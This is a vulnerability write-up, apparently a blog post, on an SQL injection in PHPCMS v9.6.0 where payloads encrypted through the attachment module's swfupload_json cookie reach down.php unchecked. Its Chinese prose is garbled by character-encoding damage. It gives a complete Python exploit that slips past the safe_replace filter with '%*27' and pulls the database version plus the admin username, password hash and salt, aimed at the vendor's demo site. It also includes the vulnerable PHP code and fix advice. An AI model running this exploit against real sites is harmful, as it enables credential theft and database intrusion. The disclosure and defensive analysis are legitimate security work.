### phpcms v9.6.0 sys_auth���ܲ�����δУ�����sqlע��

>Auth:Cryin'

-------
### ����
�����쿴��phpcms v9��ע��©������˵����δ�������ģ����������Ѿ������¸����˷�������©����ԭ���Լ����÷�ʽ��©�������øо����ޣ����Կ��²�������֤�����©��������������������ϵ�POC��д��һ�����ű������ش������֤���£�
![](http://i1.piimg.com/1949/def3dc15a41984da.png)
### POC
Python���ű����룺
```python
#!/usr/bin/env python
# encoding:utf-8
import requests
import urllib
import sys

class Poc():
    def __init__(self):
    	self.cookie={}
	def test(self):   
		#url = 'http://10.65.10.195/phpcms_v9.6.0_GBK'
		url = 'http://v9.demo.phpcms.cn/'
		print '[+]Start : PHPCMS_v9.6.0 sqli test...'
		cookie_payload='/index.php?m=wap&a=index&siteid=1'
		info_paylaod='%*27an*d%20e*xp(~(se*lect%*2af*rom(se*lect co*ncat(0x706f6374657374,us*er(),0x23,ver*sion(),0x706f6374657374))x))'
		admin_paylaod='%*27an*d%20e*xp(~(se*lect%*2afro*m(sel*ect co*ncat(0x706f6374657374,username,0x23,password,0x3a,encrypt,0x706f6374657374) fr*om v9_admin li*mit 0,1)x))'
		url_padding = '%23%26m%3D1%26f%3Dtest%26modelid%3D2%26catid%3D6'
		encode_url=url+'/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id='
		exploit_url=url+'/index.php?m=content&c=down&a_k='
		#get test cookies
		self.get_cookie(url,cookie_payload)
		#get mysql info
		self.get_sqlinfo(encode_url,info_paylaod,url_padding,exploit_url)
		#get admin info
		self.get_admininfo(encode_url,admin_paylaod,url_padding,exploit_url)

	def get_cookie(self,url,payload): 
		resp=requests.get(url+payload)
		for key in resp.cookies:
			if key.name[-7:] == '_siteid':
				cookie_head = key.name[:6]
				self.cookie[cookie_head+'_userid'] = key.value
				print '[+] Get Cookie : ' + str(self.cookie)
		return self.cookie
	def get_sqlinfo(self,url,payload,padding,exploit_url): 
		sqli_payload=''
		resp=requests.get(url+payload+padding,cookies=self.cookie)
		for key in resp.cookies:
			if key.name[-9:] == '_att_json':
				sqli_payload = key.value
				print '[+] Get mysql info Payload : ' + sqli_payload	
		info_link = exploit_url + sqli_payload
		sqlinfo=requests.get(info_link,cookies=self.cookie)
		resp = sqlinfo.content
		print '[+] Get mysql info : ' + resp.split('poctest')[1]
	def get_admininfo(self,url,payload,padding,exploit_url): 
		sqli_payload=''
		resp=requests.get(url+payload+padding,cookies=self.cookie)
		for key in resp.cookies:
			if key.name[-9:] == '_att_json':
				sqli_payload = key.value
				print '[+] Get admin info Payload : ' + sqli_payload	
		admininfo_link = exploit_url + sqli_payload
		admininfo=requests.get(admininfo_link,cookies=self.cookie)
		resp = admininfo.content
		print '[+] Get site admin info : ' + resp.split('poctest')[1]
		
if __name__ == '__main__':
    phpcms = Poc()
    phpcms.test()

```
### ©��ԭ��
��д����ʱ�������뾡����һ�Ե������©����ԭ������д��phpcms v9.6.0 sys_auth�ڽ��ܲ�����δ�����ʵ�У�����sql injection�������©����������phpcms\modules\content\down.php�ļ�init�����У���������:
```php
public function init() {
		$a_k = trim($_GET['a_k']);//��ȡa_k����
		if(!isset($a_k)) showmessage(L('illegal_parameters'));
		$a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system','auth_key'));//ʹ��sys_auth���ܲ�����DECODE��system.php�ļ��е�auth_key
		if(empty($a_k)) showmessage(L('illegal_parameters'));
		unset($i,$m,$f);
		parse_str($a_k);//�����ܺ���ַ�������������
		if(isset($i)) $i = $id = intval($i);
		if(!isset($m)) showmessage(L('illegal_parameters'));
		if(!isset($modelid)||!isset($catid)) showmessage(L('illegal_parameters'));
		if(empty($f)) showmessage(L('url_invalid'));
		$allow_visitor = 1;
		$MODEL = getcache('model','commons');
		$tablename = $this->db->table_name = $this->db->db_tablepre.$MODEL[$modelid]['tablename'];
		$this->db->table_name = $tablename.'_data';
		$rs = $this->db->get_one(array('id'=>$id));	//id����sql��ѯ���
		......���ִ���ʡ��....
		......
```
����ͨ��GET��ȡ'a_k'ֵ��������sys_auth�������н��ܣ����ﴫ����'DECODE'�����Լ������ļ�caches\configs\system.php�ļ��е�auth_key�ֶΡ����Կ���֪��������ʹ����auth_key�����н��ܲ�����������Բ鿴phpcms\libs\functions\global.func.php��384��sys_auth�����Ķ��塣
�ڶ�a_k���ܺ�ʹ��parse_str���ַ�����������������ͬʱ���롣���´��룬�����idΪ:'union select
```php
<?php 
$test='id=%27union%20select';
parse_str($test);
echo $id;
?>
```
����ڵ�26�д����봦(down.php)��id����sql��ѯ��䡣

### ©������
©���������Ѿ�˵�ˣ�Ҫ�������©�������ȵö�payload���м��ܲ������ڱ��صû�auth_key��ֵ�ǿ���֪���ģ��������ǿ϶���ͨ�á���ϸ���£��������н��ܵķ������ǿ϶�����Ӧ�ļ��ܷ���������ֻҪ�ڳ������ҵ����ü��ܷ������ܻ�ȡ������Ľӿڡ��Ǳ��ͨ�ü�����д���©����վ���ˣ���Ȼ����ҲҪ��취��ע���payload�ܹ��������˽��뵽����ӿڣ���Ҳ����˵����һ��©�����ˡ�
�������˼·���Ϳ����ڳ��򹤳���ȫ������sys_auth����ENCODE�ķ���������ͨ�����ϵ�POC���Կ����������Ѿ����������ENCODE�ط������Կ���©��������Ҳ�Ƿǳ�ϸ�ģ��������¡�
��phpcms\libs\classes\param.class.php�ļ���86�У�����set_cookie��
```php
public static function set_cookie($var, $value = '', $time = 0) {
		$time = $time > 0 ? $time : ($value == '' ? SYS_TIME - 3600 : 0);
		$s = $_SERVER['SERVER_PORT'] == '443' ? 1 : 0;
		$var = pc_base::load_config('system','cookie_pre').$var;//��ȡsystem.php�ļ���cookie_preֵ��Ϊcookies�ֶ�key��ǰ׺
		$_COOKIE[$var] = $value;
		if (is_array($value)) {
			foreach($value as $k=>$v) {
				setcookie($var.'['.$k.']', sys_auth($v, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s);
			}
		} else {
			setcookie($var, sys_auth($value, 'ENCODE'), $time, pc_base::load_config('system','cookie_path'), pc_base::load_config('system','cookie_domain'), $s);//����setcookie������������
		}
	}
```
�Ӵ����п��Կ��������ڵ���setcookieʱ������sys_auth�������Ҵ����ʱENCODE���ܲ�������sys_auth���������п����˽⵽����Ĭ��ʹ�õ�key����system.php�ļ��е�auth_key�����Ｔ��ʵ�ֶ�payload���м��ܵ�Ŀ�ġ�

�������ʣ����ΰ�payload�������Ĵ����ˣ�����Ҳʱ���©��������һ�����˾��ú�����ĵط�����phpcms\modules\attachment\attachments.php�ļ���239��swfupload_json������ʵ���У�
```php
public function swfupload_json() {
		$arr['aid'] = intval($_GET['aid']);
		$arr['src'] = safe_replace(trim($_GET['src']));//��ȡsrc����������safe_replace����
		$arr['filename'] = urlencode(safe_replace($_GET['filename']));
		$json_str = json_encode($arr);//json_encode���봦��
		$att_arr_exist = param::get_cookie('att_json');
		$att_arr_exist_tmp = explode('||', $att_arr_exist);
		if(is_array($att_arr_exist_tmp) && in_array($json_str, $att_arr_exist_tmp)) {
			return true;
		} else {
			$json_str = $att_arr_exist ? $att_arr_exist.'||'.$json_str : $json_str;
			param::set_cookie('att_json',$json_str);//����������������Ϊcookie��ֵ
			return true;			
		}
	}
```
�������������set_cookie������att_json��Ϊcookies�ֶε�key��һ���֣���set_cookie�����п��Կ�������system.php�ļ��е�cookie_preƴ����Ϊcookies��key����src��aid��filename�Ȳ���json��������ó�cookie��ֵ��src���������ֻ����safe_replace�����Ĵ�������safe_replace�Ķ���:
```php
function safe_replace($string) {
	$string = str_replace('%20','',$string);
	$string = str_replace('%27','',$string);
	$string = str_replace('%2527','',$string);
	$string = str_replace('*','',$string);
	$string = str_replace('"','&quot;',$string);
	$string = str_replace("'",'',$string);
	$string = str_replace('"','',$string);
	$string = str_replace(';','',$string);
	$string = str_replace('<','&lt;',$string);
	$string = str_replace('>','&gt;',$string);
	$string = str_replace("{",'',$string);
	$string = str_replace('}','',$string);
	$string = str_replace('\\','',$string);
	return $string;
}
```
��Ϊ��ȫ���˺�����safe_replace��%20��%27��%2527�ȶ��������滻ɾ��������ͬ����*��Ҳ�������滻ɾ�����������������%*27���������ֻʣ��%27.�����Ϳ��Զ�sqlע���payload�����ʵ��Ĵ����ɴ���������set_cookie�������Ӷ����м��ܲ�������:
```sql
%*27uni*on%20se*lect co*ncat(0x706f6374657374,ver*sion(),0x706f6374657374),2,3,4,5,6,7,8,9,10,11,12#
```
### ���POCʵ��
�ڲ���ʱ��Ҫ����һ���㣬��attachments������һ�����캯��,�������£�
```php
function __construct() {
		pc_base::load_app_func('global');
		$this->upload_url = pc_base::load_config('system','upload_url');
		$this->upload_path = pc_base::load_config('system','upload_path');		
		$this->imgext = array('jpg','gif','png','bmp','jpeg');
		$this->userid = $_SESSION['userid'] ? $_SESSION['userid'] : (param::get_cookie('_userid') ? param::get_cookie('_userid') : sys_auth($_POST['userid_flash'],'DECODE'));
		$this->isadmin = $this->admin_username = $_SESSION['roleid'] ? 1 : 0;
		$this->groupid = param::get_cookie('_groupid') ? param::get_cookie('_groupid') : 8;
		//?D??��?��?��???
		if(empty($this->userid)){
			showmessage(L('please_login','','member'));
		}
	}
```
�������ȡ��useridֵ����cookie��_userid�ֶλ�ȡ���߱�userid_flash��ֵ��ȡ���жϣ����Ϊ������ת����¼ҳ�棬����������Ҫ���ȷ���һ��ҳ���ȡ�����cookie��Ȼ��ÿ��������ϻ�ȡ��cookie�ٽ��м�⡣
���ҳ��ʵ�ֵĹ��������ɼ���cookie����poc�е�/index.php?m=wap&a=index&siteid=1����ҳ�棬��wapģ�鹹�캯����set_cookieʵ���˼���cookie������
```php
function __construct() {        
        $this->db = pc_base::load_model('content_model');
        $this->siteid = isset($_GET['siteid']) && (intval($_GET['siteid']) > 0) ? intval(trim($_GET['siteid'])) : (param::get_cookie('siteid') ? param::get_cookie('siteid') : 1);
        param::set_cookie('siteid',$this->siteid);    
        $this->wap_site = getcache('wap_site','wap');
        $this->types = getcache('wap_type','wap');
        $this->wap = $this->wap_site[$this->siteid];
        define('WAP_SITEURL', $this->wap['domain'] ? $this->wap['domain'].'index.php?' : APP_PATH.'index.php?m=wap&siteid='.$this->siteid);
        if($this->wap['status']!=1) exit(L('wap_close_status'));
    }
```
��Ȼ©��ԭ�������Ѿ������ˣ�Ҫʵ�ֶԸ�©���ļ�⣬�����ǻ�ȡcookies�ֶε�key��ǰ׺'cookie_pre'��cookie������payload���м��ܴ����Ӷ�Ӧ��'cookie_pre'_att_json�ֶ��ж�ȡ���ܺ��payload��������©��������/index.php?m=content&c=down&a_k=payload����Ƿ�ע��ɹ����ɡ���phpcms�ٷ���ʾվ�Ĳ���:
![](http://i1.piimg.com/1949/82f0c6b1bcd52c27.png)
###©���޸�
���©�����ú���������©�������߲�������©���������������������÷�������֪��������û�з������©������һ������֮����
��Ȼûʵ��ȥ���ԣ���������Ϊ���©�����÷�ʽ������ܵ��´����waf���޷���⡢������ע��payload����Ϊ���˶�*���滻ɾ����payload���Դ���ʹ������л�����
�����޸ĸ�©����ôӴ���㼶�����޸��������������Ϊ�����������ط���Ҫ������Ӧ����

>* ����safe_replace����(��Ȼ���˴����ƹ����Ǻܿ��ܻ�������Ǳ�ڵ�ע��)
>* sys_auth�������ݺ���������Ӧ��ȫУ��

�������ޣ������в���֮������ָ��~

### �ο�

[1] https://www.secpulse.com/archives/57486.html

[2] http://v9.demo.phpcms.cn/



